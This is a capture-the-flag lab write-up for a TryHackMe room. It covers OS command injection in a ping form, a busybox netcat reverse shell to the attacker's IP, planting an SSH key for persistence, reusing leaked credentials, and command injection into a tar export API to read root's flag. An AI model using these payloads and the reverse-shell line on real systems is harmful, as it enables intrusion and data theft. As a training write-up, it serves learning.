# URL
https://tryhackme.com/room/hh-infinitypool-5b3548af
# Concept
* OS command injection
* robots.txt
* network pivoting / local port forwarding
# Method of solve
## Starting Scans
* there are two ports open, `22` and `80`
* on the web app's `robots.txt` file, there are references to two endpoints:
  * `/internal` and `/status`
## Initial Access
* on the `/status` endpoint there is a ping functionality built into the page:
  * this user field is vulnerable to `OS command injection`
    * this payload will confirm the vulnerability:
    * `192.168.134.186; whoami #`
  * we can use this payload to establish a reverse shell connection to the attacker machine:
  * `busybox nc 192.168.134.186 443 -e /bin/bash`
## Privilege Escalation
### Local Port Forwarding Setup
* we will need to access a few locally-hosted webpages, so we're going to do local port forwarding to allow us to view the webpages on our web browser
1) Copy the contents of our attacker machine's `id_rsa.pub` file to the remote machine's `authorized_keys` file in the `web` user's `.ssh` directory
2) Get a list of listening ports: `ss -tulpn` (the ports we're interested in are 3000, 5038, 9000, 8089, 8088, and 8080)
3) Use SSH to setup a local port forward for each of those ports:
```
ssh -i ./id_rsa -N -L 3000:127.0.0.1:3000 -L 5038:127.0.0.1:5038 -L 9000:127.0.0.1:9000 -L 8080:127.0.0.1:8080 -L 8088:127.0.0.1:8088 -L 8089:127.0.0.1:8089 web@10.144.173.198
```
### Enumerating the web apps
* there are two extra web apps that are referenced in the running processes:
```
ps aux | less
```
* these ones:
```
/var/www/infinity_pool/automation/venv/bin/python3 /var/www/infinity_pool/automation/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
/var/www/infinity_pool/watchtower/venv/bin/python3 /var/www/infinity_pool/watchtower/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
```
* so we check out the app on the port 3000
* there's two endpoints indicated: `/api/health` and `/api/config`
  * the `/config` endpoint exposes credentials as well as endpoint for a portal:
    * `FreePBXUCPTemplateCreator`:`St4yN0t1c3d_2026` with the endpoint `http://127.0.0.1:8080/ucp`
  * the `/health` endpoint doesn't give us anything useful
* we were told there's an app on port `8080` with the endpoint `/ucp`
  * at that endpoint, we see a login page for an app called `freePBX`
  * we use the credentials from the `/api/config` endpoint from port 3000 to login
  * once inside, we see this app is used to manage telephone systems:
    * we create a dashboard for ourselves
    * then we create a voice mail widget for this dashboard
    * we see that we have a voice mail, the metadata contains `"Automation Key cc_auto_7b3f9a1c4e0d2f6a"`, with the number 9000, which implies that it's to be used with the app on port 9000
   * the app on port `9000` has a `/health` endpoint, which we can find with directory busting
     * on the `/health` endpoint we discover another path
     ```
     POST /jobs/export":{"auth":"Authorization: Bearer <automation key>","body":{"report":"<report name>"}
     ```
     * this informs us that there's a POST request endpoint at `/jobs/export` that takes JSON data as a body and requires the automation key as a `Bearer` token
     * we can access the endpoint with the automation key we discovered earlier with this curl command:
     ```
     curl --json '{"report":"something"}' -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" http://localhost:9000/jobs/export
     ```
     * the response from the server lets us know exactly what command is being run-- it's a tar command:
     ```
     tar czf /var/automation/exports/<user_input_here>.tgz /var/automation/data 2>&1
     ```
     * we can potentially do OS command injection into this command because the filepath is quoted
     * we find that if we provide at least 3 arguments, separated by spaces, the middle arguments will be interpreted as system commands
     * so this payload will run the `id` command:
     ```
     {"report":"test1; id ;test2"}
     ```
     because the first argument, `test1` is appended to the filepath, the `id` argument is run as a command, and `test2` has `.tgz` appended to it
     * we can run this payload to read the `flag.txt` file in the `/root` directory directly
     ```
     {"report":"test1; cat /root/root.txt ;test2"}
     ```
     * done
  
